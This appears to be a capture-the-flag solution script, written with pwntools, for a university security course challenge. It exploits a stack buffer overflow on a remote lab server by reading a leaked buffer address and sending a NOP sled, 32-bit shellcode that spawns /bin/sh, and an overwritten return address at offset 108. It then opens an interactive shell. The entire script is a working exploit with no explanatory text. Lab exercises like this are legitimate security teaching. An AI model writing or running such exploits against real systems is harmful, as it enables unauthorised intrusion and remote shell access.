#!/usr/bin/python3

from pwn import *

DEBUG = False

if DEBUG:
    r = process('./program')

else:
    r = remote('ctf-fsi.fe.up.pt', 4001)

# Replace the content with the actual shellcode
shellcode = (
    "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f"
    "\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x31"
    "\xd2\x31\xc0\xb0\x0b\xcd\x80"
).encode('latin-1')

# Fill the content with NOP's
content = bytearray(0x90 for _ in range(300))

# Put the shellcode somewhere in the payload
start = len(content) - len(shellcode)
content[start:start + len(shellcode)] = shellcode

# Decide the return address value and put it somewhere in the payload
r.recvuntil(b" is ")

buffer = int(r.recvuntil(b".")[:-1], 16)

ret = buffer + 200
offset = 108

# Use 4 for 32-bit address and 8 for 64-bit address
L = 4
content[offset:offset + L] = (ret).to_bytes(L, byteorder='little')

r.recvuntil(b":")
r.sendline(content)
r.interactive()
